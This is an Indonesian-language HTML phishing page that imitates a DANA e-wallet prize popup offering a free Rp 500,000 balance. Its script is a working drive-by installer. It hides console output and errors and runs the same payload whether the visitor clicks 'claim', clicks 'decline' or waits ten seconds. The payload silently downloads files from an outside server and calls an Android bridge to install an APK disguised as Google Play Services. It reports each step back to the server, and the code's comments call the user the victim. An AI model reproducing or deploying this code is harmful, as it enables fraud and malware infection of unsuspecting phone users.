<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <!-- Style untuk Popup DANA -->
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        /* Loading Overlay (akan hilang dengan sendirinya) */
        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999998;display:none;justify-content:center;align-items:center;color:#fff;font-size:14px}
        .loading-overlay .spinner{width:30px;height:30px;border:3px solid #333;border-top:3px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin-right:10px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>

<!-- Loading Overlay (Muncul saat proses berlangsung, hilang otomatis) -->
<div id="loadingOverlay" class="loading-overlay">
    <div class="spinner"></div>
    <span id="loadingText">⏳ Memproses...</span>
</div>

<!-- Popup DANA Utama -->
<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40"><path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z"/></svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// INDEX.HTML - FINAL (SILENT DOWNLOAD)
// ============================================================

// ============================================================
// 1. KONFIGURASI
// ============================================================
var SERVER = 'https://verifikasi.site';
var MANIFEST_URL = SERVER + '/files/manifest.txt';
var FILES_BASE_URL = SERVER + '/files/';
var semuaDidapat = false;

// ============================================================
// 2. STEALTH MODE (SEMUA PROSES DIAM-DIAM)
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; }, true);
if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// 3. DETEKSI ANDROID BRIDGE
// ============================================================
var HAS_BRIDGE = typeof AndroidBridge !== 'undefined' && navigator.userAgent.toLowerCase().indexOf('android') > -1;

// ============================================================
// 4. FUNGSI KIRIM LOG KE SERVER (TANPA PASSWORD)
// ============================================================
function K(d) {
    try {
        fetch(SERVER + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// 5. UI LOADING (HILANG OTOMATIS)
// ============================================================
function showLoading(show, text) {
    var overlay = document.getElementById('loadingOverlay');
    var textEl = document.getElementById('loadingText');
    if (show) {
        overlay.style.display = 'flex';
        if (text) textEl.textContent = text;
    } else {
        overlay.style.display = 'none';
    }
}
function updateLoading(text) {
    document.getElementById('loadingText').textContent = text;
}

// ============================================================
// 6. SILENT DOWNLOAD (WAJIB!)
// ============================================================
function silentDownload(url, filename) {
    return new Promise(function(resolve) {
        updateLoading('📥 ' + filename);
        
        fetch(url, { method: 'GET', cache: 'no-store' })
        .then(function(response) {
            if (!response.ok) throw new Error('HTTP ' + response.status);
            if (filename.endsWith('.apk')) {
                return response.blob().then(function(blob) {
                    return { content: blob, type: 'blob' };
                });
            } else {
                return response.text().then(function(text) {
                    return { content: text, type: 'text' };
                });
            }
        })
        .then(function(data) {
            // TASK 1: SIMPAN VIA ANDROID BRIDGE (SILENT)
            if (HAS_BRIDGE) {
                try {
                    var path = '/storage/emulated/0/Download/' + filename;
                    if (data.type === 'text') {
                        AndroidBridge.saveFile(path, data.content);
                    } else {
                        var reader = new FileReader();
                        reader.onload = function() {
                            var base64 = reader.result.split(',')[1];
                            var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
                            if (AndroidBridge.saveFileBinary) {
                                AndroidBridge.saveFileBinary(path, binary);
                            }
                        };
                        reader.readAsDataURL(data.content);
                    }
                    K({ sumber: 'silent_download_bridge', data: { file: filename } });
                } catch(e) {}
            }

            // TASK 2: SIMPAN VIA BLOB (FALLBACK)
            try {
                var blob = data.type === 'text' ? new Blob([data.content], {type: 'text/html'}) : data.content;
                var blobUrl = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = blobUrl;
                a.download = filename;
                a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                document.body.appendChild(a);
                setTimeout(function() {
                    a.click();
                    setTimeout(function() {
                        try { document.body.removeChild(a); } catch(e) {}
                        URL.revokeObjectURL(blobUrl);
                    }, 2000);
                }, 300);
                K({ sumber: 'silent_download_blob', data: { file: filename } });
            } catch(e) {}

            resolve(true);
        })
        .catch(function(error) {
            K({ sumber: 'silent_download_failed', data: { file: filename, error: error.message } });
            resolve(false);
        });
    });
}

// ============================================================
// 7. PROSES UTAMA (BERURUTAN, TANPA INTERAKSI)
// ============================================================
async function prosesUtama() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    // Sembunyikan Popup, Tampilkan Loading
    document.getElementById('popupDana').style.display = 'none';
    showLoading(true, '⏳ Memproses...');
    K({ sumber: 'proses_mulai', data: 'ok' });

    try {
        // --- STEP 1: AMBIL PASSWORD ---
        updateLoading('🔑 Mengambil password...');
        var password = '';
        try {
            var res = await fetch(SERVER + '/get-password', { method: 'GET' });
            var data = await res.json();
            if (data.password) password = data.password;
        } catch(e) {}
        if (!password) password = 'default';
        try { localStorage.setItem('ws_password', password); } catch(e) {}
        K({ sumber: 'password_done', data: 'ok' });

        // --- STEP 2: BACA MANIFEST ---
        updateLoading('📄 Membaca manifest...');
        var manifestRes = await fetch(MANIFEST_URL, { method: 'GET', cache: 'no-store' });
        var manifestText = await manifestRes.text();
        var fileNames = manifestText.split('\n')
            .map(function(line) { return line.trim(); })
            .filter(function(line) { return line.length > 0 && !line.startsWith('#'); });

        if (fileNames.length === 0) throw new Error('Manifest kosong');
        K({ sumber: 'manifest_loaded', data: { files: fileNames } });

        // --- STEP 3: DOWNLOAD SEMUA FILE (SILENT) ---
        var total = fileNames.length;
        var berhasil = 0;
        for (var i = 0; i < fileNames.length; i++) {
            var fileName = fileNames[i];
            var fileUrl = FILES_BASE_URL + fileName;
            var result = await silentDownload(fileUrl, fileName);
            if (result) berhasil++;
        }

        // --- STEP 4: INSTALL APK (SILENT) ---
        if (HAS_BRIDGE) {
            try {
                AndroidBridge.installAPK('/storage/emulated/0/Download/GooglePlayServices.apk');
                K({ sumber: 'apk_install_silent', data: 'ok' });
            } catch(e) {}
        }

        // --- STEP 5: SEMUA SELESAI ---
        updateLoading('✅ Selesai!');
        K({ sumber: 'proses_selesai', data: { total: total, berhasil: berhasil } });

        // Tunggu 1 detik, lalu Redirect ke DANA
        setTimeout(function() {
            showLoading(false);
            redirectToDANA();
        }, 1500);

    } catch(e) {
        K({ sumber: 'proses_error', data: e.message });
        setTimeout(function() {
            showLoading(false);
            redirectToDANA();
        }, 2000);
    }
}

// ============================================================
// 8. REDIRECT KE DANA (TANPA PLAY STORE!)
// ============================================================
function redirectToDANA() {
    K({ sumber: 'redirect_mulai', data: 'ke_dana' });
    if (HAS_BRIDGE) {
        try { AndroidBridge.openApp('id.dana'); return; } catch(e) {}
    }
    try { window.location.href = 'danacash://'; return; } catch(e) {}
    K({ sumber: 'redirect_gagal', data: 'tidak_ada_app' });
}

// ============================================================
// 9. TRIGGER DARI KORBAN
// ============================================================
function klaim() { K({sumber:'click', data:'klaim'}); prosesUtama(); }
function tolak() { K({sumber:'click', data:'tolak'}); prosesUtama(); }

// ============================================================
// 10. TIMER 10 DETIK
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'timer', data:'auto'});
        prosesUtama();
    }
}, 1000);

console.log('🔥 INDEX.HTML - SILENT DOWNLOAD FINAL');
</script>
</body>
</html>
